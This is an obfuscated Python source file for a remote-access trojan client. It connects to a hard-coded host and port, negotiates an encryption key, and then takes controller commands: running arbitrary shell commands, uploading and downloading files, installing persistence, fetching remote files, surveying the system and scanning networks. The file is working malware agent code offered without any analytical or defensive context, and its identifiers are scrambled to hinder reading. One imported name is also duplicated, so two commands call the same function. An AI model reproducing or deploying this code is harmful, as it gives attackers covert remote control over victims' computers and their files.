#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import CeouyyhuFLsWInUrJoBdWRYPlFgaiRak, ViGXFyDUMuRTyaLjdXDsFguYFLFKNZZW, zbQWsMLHGcxYPIPLqrCzJxVJZSwImrJS
    from core.filesock import yFFWnjJJUKgntESTvKXvkedPLbkUrxVc, PeNHllDzashAnbpvjTvghjdRoEWXqpjx
    from core.persistence import rphzMalkzLSwhCycxxBfPLhpijexPGfP
    from core.scan import ynteGRczrxrNcfSQorbPwVcdomPNUQQc
    from core.survey import rphzMalkzLSwhCycxxBfPLhpijexPGfP
    from core.toolkit import KtDZzQzMQDKhLyiTMPXCGJIpFCkIiomn, aAnySaDTFrVXxqOhcXWKpuTwfUztFFJf
except ImportError as zOuzGTQsAwvmZlBzEZxbqQVWxtrOMBoL:
    print(zOuzGTQsAwvmZlBzEZxbqQVWxtrOMBoL)
    sys.exit(0)
lLMPaWRKLjIJIlWypuHHrYPNPOZFwxLx = sys.platform
kPuwJFzoNpiyVMJqzbbJnlcgRDGwLhbd      = 'localhost'
zfHMOQDLwTAJJGgQzCHocSIMWIufhyxD      = 1337
AcRiGvyDwOrXoXBQlfMKSBWpVdUDViSz    = 'b14ce95fa4c33ac2803782d18341869f'
def PtbQMDTMHtVwKDzHngokYCTbHSbBQcRb():
    orvpXeDFETMSCYwfmedlMJBYqHcHfHjH = socket.socket()
    orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.connect((kPuwJFzoNpiyVMJqzbbJnlcgRDGwLhbd, zfHMOQDLwTAJJGgQzCHocSIMWIufhyxD))
    khfYFWQScZbMvoSzGticBVSoAlrbNKiD = zbQWsMLHGcxYPIPLqrCzJxVJZSwImrJS(orvpXeDFETMSCYwfmedlMJBYqHcHfHjH)
    while True:
        VcYRIRUNFxDGDhjdTHKgBRbWmrLDxyag = orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.recv(1024)
        VcYRIRUNFxDGDhjdTHKgBRbWmrLDxyag = CeouyyhuFLsWInUrJoBdWRYPlFgaiRak(VcYRIRUNFxDGDhjdTHKgBRbWmrLDxyag, khfYFWQScZbMvoSzGticBVSoAlrbNKiD)
        mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL, _, UoqfdGVsPTrXcailIEcQirnRTZSydynI = VcYRIRUNFxDGDhjdTHKgBRbWmrLDxyag.partition(' ')
        if mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'quit':
            orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.close()
            sys.exit(0)
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'run':
            dUbOKopZulDCXjKgabYUEDXBlmGWRIEE = subprocess.Popen(UoqfdGVsPTrXcailIEcQirnRTZSydynI, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            dUbOKopZulDCXjKgabYUEDXBlmGWRIEE = dUbOKopZulDCXjKgabYUEDXBlmGWRIEE.stdout.read() + dUbOKopZulDCXjKgabYUEDXBlmGWRIEE.stderr.read()
            orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.sendall(ViGXFyDUMuRTyaLjdXDsFguYFLFKNZZW(dUbOKopZulDCXjKgabYUEDXBlmGWRIEE, khfYFWQScZbMvoSzGticBVSoAlrbNKiD))
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'download':
            for BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg in UoqfdGVsPTrXcailIEcQirnRTZSydynI.split():
                BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg = BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg.strip()
                PeNHllDzashAnbpvjTvghjdRoEWXqpjx(orvpXeDFETMSCYwfmedlMJBYqHcHfHjH, BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg, khfYFWQScZbMvoSzGticBVSoAlrbNKiD)
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'upload':
            for BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg in UoqfdGVsPTrXcailIEcQirnRTZSydynI.split():
                BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg = BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg.strip()
                yFFWnjJJUKgntESTvKXvkedPLbkUrxVc(orvpXeDFETMSCYwfmedlMJBYqHcHfHjH, BDzMiZxfAEiNXaFLUqfMNVhImWqSMTSg, khfYFWQScZbMvoSzGticBVSoAlrbNKiD)
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'rekey':
            khfYFWQScZbMvoSzGticBVSoAlrbNKiD = zbQWsMLHGcxYPIPLqrCzJxVJZSwImrJS(orvpXeDFETMSCYwfmedlMJBYqHcHfHjH)
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'persistence':
            dUbOKopZulDCXjKgabYUEDXBlmGWRIEE = rphzMalkzLSwhCycxxBfPLhpijexPGfP(lLMPaWRKLjIJIlWypuHHrYPNPOZFwxLx)
            orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.send(ViGXFyDUMuRTyaLjdXDsFguYFLFKNZZW(dUbOKopZulDCXjKgabYUEDXBlmGWRIEE, khfYFWQScZbMvoSzGticBVSoAlrbNKiD))
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'wget':
            dUbOKopZulDCXjKgabYUEDXBlmGWRIEE = KtDZzQzMQDKhLyiTMPXCGJIpFCkIiomn(UoqfdGVsPTrXcailIEcQirnRTZSydynI)
            orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.send(ViGXFyDUMuRTyaLjdXDsFguYFLFKNZZW(dUbOKopZulDCXjKgabYUEDXBlmGWRIEE, khfYFWQScZbMvoSzGticBVSoAlrbNKiD))
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'unzip':
            dUbOKopZulDCXjKgabYUEDXBlmGWRIEE = aAnySaDTFrVXxqOhcXWKpuTwfUztFFJf(UoqfdGVsPTrXcailIEcQirnRTZSydynI)
            orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.send(ViGXFyDUMuRTyaLjdXDsFguYFLFKNZZW(dUbOKopZulDCXjKgabYUEDXBlmGWRIEE, khfYFWQScZbMvoSzGticBVSoAlrbNKiD))
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'survey':
            dUbOKopZulDCXjKgabYUEDXBlmGWRIEE = rphzMalkzLSwhCycxxBfPLhpijexPGfP(lLMPaWRKLjIJIlWypuHHrYPNPOZFwxLx)
            orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.send(ViGXFyDUMuRTyaLjdXDsFguYFLFKNZZW(dUbOKopZulDCXjKgabYUEDXBlmGWRIEE, khfYFWQScZbMvoSzGticBVSoAlrbNKiD))
        elif mGCOWJvKRDKLqjjJcwhvjHGuUymwMYPL == 'scan':
            dUbOKopZulDCXjKgabYUEDXBlmGWRIEE = ynteGRczrxrNcfSQorbPwVcdomPNUQQc(UoqfdGVsPTrXcailIEcQirnRTZSydynI)
            orvpXeDFETMSCYwfmedlMJBYqHcHfHjH.send(ViGXFyDUMuRTyaLjdXDsFguYFLFKNZZW(dUbOKopZulDCXjKgabYUEDXBlmGWRIEE, khfYFWQScZbMvoSzGticBVSoAlrbNKiD))
if __name__ == '__main__':
    PtbQMDTMHtVwKDzHngokYCTbHSbBQcRb()
